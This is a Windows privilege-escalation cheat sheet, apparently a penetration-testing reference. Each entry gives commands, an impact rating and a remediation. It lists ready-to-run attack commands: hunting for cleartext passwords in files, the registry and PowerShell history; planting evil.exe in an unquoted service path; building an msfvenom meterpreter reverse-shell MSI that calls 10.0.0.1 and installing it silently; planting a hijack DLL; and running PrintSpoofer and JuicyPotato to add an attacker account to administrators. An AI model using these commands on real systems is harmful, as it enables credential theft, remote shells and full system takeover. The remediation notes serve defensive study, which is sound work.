label: Host & OS Enumeration
command:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
set
hostname
ver
description:
Details: Gather foundational information about the operating system, architecture, environment variables, and applied patch levels (hotfixes) to identify applicable kernel exploits.

Category: Enumeration

Impact: Reconnaissance

Remediation: Apply latest MSRC security patches and restrict wmic access where appropriate.

label: User & Privilege Enumeration
command:
whoami /all
net user
net localgroup administrators
net user %username%
description:
Details: Identify the current user's security context, group memberships, and assigned privileges. Look for dangerous privileges like SeImpersonatePrivilege, SeBackupPrivilege, or SeRestorePrivilege.

Category: Enumeration

Impact: Reconnaissance

Remediation: Implement Principle of Least Privilege. Remove unnecessary privileges (e.g., SeImpersonatePrivilege) from service accounts.

label: Network & Connection Enumeration
description:
Details: Enumerate active network connections, listening ports, routing tables, and ARP caching to understand the host's position within the network and discover internal services bound only to localhost.

Category: Enumeration

Impact: Reconnaissance

Remediation: Use Windows Firewall to restrict inbound/outbound traffic and limit local port binding.

label: Hunt for Cleartext Passwords
command:
findstr /si password *.txt *.xml *.ini *.config
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
type C:\Windows\Panther\Unattend.xml
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
description:
Details: Search the filesystem, registry, credential manager, untended install files, and PowerShell history files for plaintext passwords or stored credentials.

Category: Credential Access

Impact: High

Remediation: Avoid storing plaintext credentials in scripts, config files, or the registry. Utilize DPAPI, secure credential vaults, and clear PowerShell history.

label: Service & Permissions Enumeration
description:
Details: Identify all running services, particularly auto-starting services outside the default Windows directories. Utilize Sysinternals accesschk (if available) to find services with weak configurations or writable executable paths.

Category: Enumeration

Impact: Reconnaissance

Remediation: Ensure strict DACLs on all service configuration registry keys and physical executable files.

label: Scheduled Tasks Enumeration
command:
schtasks /query /fo LIST /v | findstr /i "TaskToRun"
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,TaskPath,State
description:
Details: Enumerate custom scheduled tasks to identify scripts or binaries executed repetitively by higher-privileged accounts (like SYSTEM or Administrator) that might be writable.

Category: Enumeration

Impact: Reconnaissance

Remediation: Lock down file permissions on scripts and binaries executed via Scheduled Tasks to prevent unprivileged modification.

label: Unquoted Service Path Hijacking
command:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /v "\""
icacls "C:\Program Files\Vulnerable App\" 
copy /y evil.exe "C:\Program Files\Vulnerable App\Common.exe"
sc stop VulnService && sc start VulnService
description:
Details: Exploit services configured without quotation marks around their executable paths that contain spaces. An attacker can place a malicious executable (e.g., Common.exe) in a writable directory higher up the path, intercepting the service execution and running as SYSTEM.

Category: Privilege Escalation

Impact: SYSTEM Access

Remediation: Enclose all service executable paths in quotation marks within the registry.

label: AlwaysInstallElevated Abuse
command:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
description:
Details: If the AlwaysInstallElevated group policy is enabled in both HKCU and HKLM, unprivileged users can install .msi files with NT AUTHORITY\SYSTEM privileges. Attackers build a payload-wrapped MSI and execute it silently.

Category: Privilege Escalation

Impact: SYSTEM Access

Remediation: Disable the AlwaysInstallElevated group policy to prevent unprivileged users from installing software with elevated rights.

label: DLL Hijacking (Missing DLLs)
command:
ProcessMonitor.exe /BackingFile "procmon.pml"
# Filter: Result is "NAME NOT FOUND", Path ends with ".dll"
icacls "C:\Vulnerable\Path"
x86_64-w64-mingw32-gcc payload.c -shared -o MissingDLL.dll
copy payload.dll "C:\Vulnerable\Path\MissingDLL.dll"
description:
Details: Identify privileged applications attempting to load non-existent DLLs. If the attacker has write access to any directory in the system PATH before the intended location, they can inject a malicious DLL that will be executed in the context of the vulnerable application.

Category: Privilege Escalation

Impact: SYSTEM Access

Remediation: Ensure applications use absolute paths when loading DLLs and enforce strict directory permissions on all folders in the system PATH.

label: Token Impersonation (PrintSpoofer / Potatoes)
command:
whoami /priv | findstr "SeImpersonatePrivilege"
PrintSpoofer64.exe -i -c cmd.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators attacker /add" -t *
description:
Details: Service accounts (e.g., IIS or MSSQL) often hold SeImpersonatePrivilege. Utilities like PrintSpoofer (exploiting the Spooler service) or RoguePotato (exploiting DCOM) coerce the SYSTEM account to authenticate to an attacker-controlled named pipe, allowing theft of the SYSTEM token.

Category: Privilege Escalation

Impact: SYSTEM Access

Remediation: Disable the Spooler service on domain controllers and sensitive servers. Remove SeImpersonatePrivilege from service accounts when not strictly required.
